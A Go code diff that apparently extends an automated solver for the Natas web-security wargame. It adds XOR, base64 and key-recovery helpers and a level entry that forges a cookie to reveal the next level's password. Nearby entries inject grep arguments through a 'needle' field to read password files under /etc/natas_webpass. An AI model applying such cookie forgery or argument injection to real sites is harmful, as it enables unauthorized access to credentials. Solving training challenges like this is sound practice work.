@@ -10,6 +10,7 @@ import (
 	"log"
 	"net/http"
 	"net/url"
+	"strings"
 
 	"github.com/MJKWoolnough/errors"
 	"github.com/MJKWoolnough/memio"
@@ -130,9 +131,18 @@ type Base64Decode struct {
 
 func (b Base64Decode) Grab(r http.Request) string {
 	str := b.Grabber.Grab(r)
-	res, err := base64.StdEncoding.DecodeString(str)
+	res, err := base64.StdEncoding.DecodeString(strings.Replace(str, "%3D", "=", -1))
 	e(err)
 	return string(res)
+}
+
+type Base64Encode struct {
+	Grabber
+}
+
+func (b Base64Encode) Grab(r http.Request) string {
+	str := b.Grabber.Grab(r)
+	return base64.StdEncoding.EncodeToString([]byte(str))
 }
 
 type SetData map[string]Grabber
@@ -172,6 +182,44 @@ func (c Cookie) Grab(r http.Request) string {
 	panic(errors.Error("could not find cookie"))
 }
 
+type XOR struct {
+	Input, Key Grabber
+}
+
+func (x XOR) Grab(r http.Request) string {
+	i := x.Input.Grab(r)
+	k := x.Key.Grab(r)
+	o := make([]byte, len(i))
+	for n, c := range []byte(i) {
+		o[n] = c ^ k[n%len(k)]
+	}
+	return string(o)
+}
+
+type FindRepeating struct {
+	Grabber
+}
+
+func (f FindRepeating) Grab(r http.Request) string {
+	str := f.Grabber.Grab(r)
+	for length := 1; length < len(str); length++ {
+		if r := strings.Repeat(str[:length], 1+(len(str)/length)); r[:len(str)] == str {
+			return str[:length]
+		}
+	}
+	return str
+}
+
+type Combine struct {
+	Prefix, Suffix Grabber
+}
+
+func (c Combine) Grab(r http.Request) string {
+	prefix := c.Prefix.Grab(r)
+	suffix := c.Suffix.Grab(r)
+	return prefix + suffix
+}
+
 var levels = [...]Grabber{
 	Prefixed{"The password for natas1 is ", 32},
 	Prefixed{"The password for natas2 is ", 32},
@@ -184,6 +232,7 @@ var levels = [...]Grabber{
 	Post{Prefixed{"The password for natas9 is ", 32}, SetData{"submit": Text{"Submit Query"}, "secret": Base64Decode{Reverse{Hex2Dec{Path{Prefixed{"$encodedSecret&nbsp;=&nbsp;\"", 32}, Text{"/index-source.html"}}}}}}},
 	Get{Prefixed{"/etc/natas_webpass/natas10:", 32}, SetData{"needle": Text{"-H \"\" /etc/natas_webpass/natas10"}}},
 	Get{Prefixed{"/etc/natas_webpass/natas11:", 32}, SetData{"needle": Text{"-H \"\" /etc/natas_webpass/natas11"}}},
+	Headers{Prefixed{"The password for natas12 is ", 32}, SetData{"Cookie": Combine{Text{"data="}, Base64Encode{XOR{Text{"{\"showpassword\":\"yes\",\"bgcolor\":\"#ffffff\"}"}, FindRepeating{XOR{Base64Decode{Cookie{"data"}}, Text{"{\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"}"}}}}}}}},
 }
 
 func e(err error) {
